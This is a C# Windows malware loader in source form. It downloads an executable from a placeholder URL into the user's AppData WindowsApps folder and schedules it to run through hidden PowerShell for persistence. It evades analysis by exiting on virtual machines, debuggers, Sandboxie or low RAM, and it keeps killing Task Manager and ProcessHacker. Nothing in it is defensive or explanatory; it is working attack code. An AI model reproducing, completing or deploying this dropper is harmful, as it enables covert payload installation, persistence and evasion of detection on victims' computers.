using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    private readonly static List<string> ProcessName = new List<string> { "ProcessHacker", "taskmgr" };
    public static bool blocker=false;

    static void Main(string[] args)
    {
        string UN = System.Environment.UserName;

        new Thread(() =>
        {
            AV();
        }).Start();

        try
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile("Enter URL", @"C:\\Users\\" + UN + "\\AppData\\Local\\Microsoft\\WindowsApps\\Get-Variable.exe");
            string SCT = "/C schtasks.exe /create /tn WSHOBJECT /st 00:00 /du 9999:59 /sc once /ri 1 /f /tr \"powershell.exe -windowstyle hidden Get-Variable\" ";
            System.Diagnostics.Process.Start("CMD.exe", SCT);
        }
        catch (WebException ex)
        {
            Console.WriteLine("Message is " + ex.Message);

        }
    }

    public static void AV()
    {
        if (DV() || DB() || DS() || ram())
            Environment.FailFast(null);

        while (true)
        {
            DP();
            Thread.Sleep(10);
             if (blocker)
            {
                break;
            }
        }
    }

      private static bool ram()
    {
        long memKb;
        GetPhysicallyInstalledSystemMemory(out memKb);
        long ram = (memKb / 1024 / 1024);
        if (ram < 4)
            return true;
        else
            return false;
    }

    private static bool DV()
    {
        using (var search = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
            using (var things = search.Get())
            {
                foreach (var thing in things)
                {
                    string manufacturer = thing["Manufacturer"].ToString().ToLower();
                    if ((manufacturer == "microsoft corporation" && thing["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                        || manufacturer.Contains("vmware")
                        || thing["Model"].ToString() == "VirtualBox")
                    {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private static bool DB()
    {
        bool isdebug = false;
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isdebug);
        return isdebug;
    }

    private static bool DS()
    {
        if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            return true;
        else
            return false;
    }

    private static void DP()
    {
        foreach (Process process in Process.GetProcesses())
        {
            try
            {
                if (ProcessName.Contains(process.ProcessName))
                    process.Kill();
            }
            catch { }
        }
    }

}


